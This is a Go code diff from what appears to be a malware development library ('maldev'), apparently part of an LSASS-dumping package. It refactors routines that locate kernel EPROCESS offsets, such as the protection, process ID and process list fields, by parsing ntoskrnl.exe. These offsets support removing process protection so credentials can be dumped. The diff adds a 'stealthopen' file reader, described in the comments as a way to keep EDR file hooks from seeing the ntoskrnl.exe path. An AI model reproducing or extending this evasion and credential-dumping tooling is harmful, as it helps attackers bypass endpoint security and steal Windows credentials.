@@ -6,7 +6,8 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"os"
+
+	"github.com/oioio-space/maldev/evasion/stealthopen"
 )
 
 // Dynamic EPROCESS offset discovery.
@@ -53,21 +54,23 @@ var ErrProtectionOffsetNotFound = errors.New("lsassdump: PsIsProtectedProcess pr
 // a captured ntoskrnl.exe explicitly (the parser is pure Go via
 // debug/pe — no Windows runtime dependency).
 //
+// `opener` is the optional stealthopen.Opener — pass nil for plain
+// os.Open, non-nil to route the read through a stealth strategy
+// (NTFS Object ID, etc.) so a path-based EDR file hook never sees
+// the ntoskrnl.exe path.
+//
 // The returned offset cross-validates `PsIsProtectedProcess` and
 // `PsIsProtectedProcessLight` — both exports MUST agree (they
 // compile to identical wrappers around the same EPROCESS field).
 // A mismatch surfaces as ErrProtectionOffsetNotFound to refuse
 // shipping a wrong value.
-func DiscoverProtectionOffset(path string) (uint32, error) {
-	if path == "" {
-		root := os.Getenv("SystemRoot")
-		if root == "" {
-			return 0, fmt.Errorf("DiscoverProtectionOffset: no path and SystemRoot unset")
-		}
-		path = root + `\System32\ntoskrnl.exe`
+func DiscoverProtectionOffset(path string, opener stealthopen.Opener) (uint32, error) {
+	path, err := defaultNtoskrnlPath(path, "DiscoverProtectionOffset")
+	if err != nil {
+		return 0, err
 	}
 
-	f, err := os.Open(path)
+	f, err := stealthopen.Use(opener).Open(path)
 	if err != nil {
 		return 0, fmt.Errorf("open %s: %w", path, err)
 	}
@@ -124,17 +127,15 @@ func SectionSignatureLevelOffset(protectionOff uint32) uint32 {
 // `[rcx+disp32]`. The disp32 starts at file offset 3 of the function.
 //
 // Empty path defaults to %SystemRoot%\System32\ntoskrnl.exe (same
-// convention as DiscoverProtectionOffset).
-func DiscoverUniqueProcessIdOffset(path string) (uint32, error) {
-	if path == "" {
-		root := os.Getenv("SystemRoot")
-		if root == "" {
-			return 0, fmt.Errorf("DiscoverUniqueProcessIdOffset: no path and SystemRoot unset")
-		}
-		path = root + `\System32\ntoskrnl.exe`
+// convention as DiscoverProtectionOffset). `opener` is the optional
+// stealthopen.Opener — pass nil for plain os.Open.
+func DiscoverUniqueProcessIdOffset(path string, opener stealthopen.Opener) (uint32, error) {
+	path, err := defaultNtoskrnlPath(path, "DiscoverUniqueProcessIdOffset")
+	if err != nil {
+		return 0, err
 	}
 
-	f, err := os.Open(path)
+	f, err := stealthopen.Use(opener).Open(path)
 	if err != nil {
 		return 0, fmt.Errorf("open %s: %w", path, err)
 	}
@@ -192,16 +193,15 @@ func DiscoverActiveProcessLinksOffset(uniqueProcessIDOff uint32) uint32 {
 // `PsActiveProcessLinks` doubly-linked list.
 //
 // Empty path defaults to %SystemRoot%\System32\ntoskrnl.exe.
-func DiscoverInitialSystemProcessRVA(path string) (uint32, error) {
-	if path == "" {
-		root := os.Getenv("SystemRoot")
-		if root == "" {
-			return 0, fmt.Errorf("DiscoverInitialSystemProcessRVA: no path and SystemRoot unset")
-		}
-		path = root + `\System32\ntoskrnl.exe`
+// `opener` is the optional stealthopen.Opener — pass nil for plain
+// os.Open.
+func DiscoverInitialSystemProcessRVA(path string, opener stealthopen.Opener) (uint32, error) {
+	path, err := defaultNtoskrnlPath(path, "DiscoverInitialSystemProcessRVA")
+	if err != nil {
+		return 0, err
 	}
 
-	f, err := os.Open(path)
+	f, err := stealthopen.Use(opener).Open(path)
 	if err != nil {
 		return 0, fmt.Errorf("open %s: %w", path, err)
 	}
@@ -236,7 +236,7 @@ func DiscoverInitialSystemProcessRVA(path string) (uint32, error) {
 //
 // Both decoded to the same disp32 = EPROCESS.Protection offset.
 func extractProtectionOffset(f io.ReaderAt, pf *pe.File, name string) (uint32, error) {
-	rva, err := exportRVA(pf, name)
+	rva, err := findExportRVA(pf, name)
 	if err != nil {
 		return 0, err
 	}
@@ -272,18 +272,6 @@ func extractProtectionOffset(f io.ReaderAt, pf *pe.File, name string) (uint32, e
 // the mod + rm bits; the comparison value 0x81 is `mod=10, rm=001`.
 func isModRMRcxDisp32(b byte) bool {
 	return (b & 0xC7) == 0x81
-}
-
-// exportRVA looks up `name` in the PE's export directory and
-// returns its RVA. debug/pe gives us a slice of exports — we walk
-// it linearly because export tables are small (<10K entries on a
-// typical kernel image).
-func exportRVA(pf *pe.File, name string) (uint32, error) {
-	// debug/pe doesn't expose export-directory walking directly
-	// across versions; use the Symbols slice (covers exports +
-	// internals on stripped binaries we don't have access to). For
-	// proper export walking we parse the Export Directory ourselves.
-	return findExportRVA(pf, name)
 }
 
 // findExportRVA parses the IMAGE_EXPORT_DIRECTORY by hand to locate
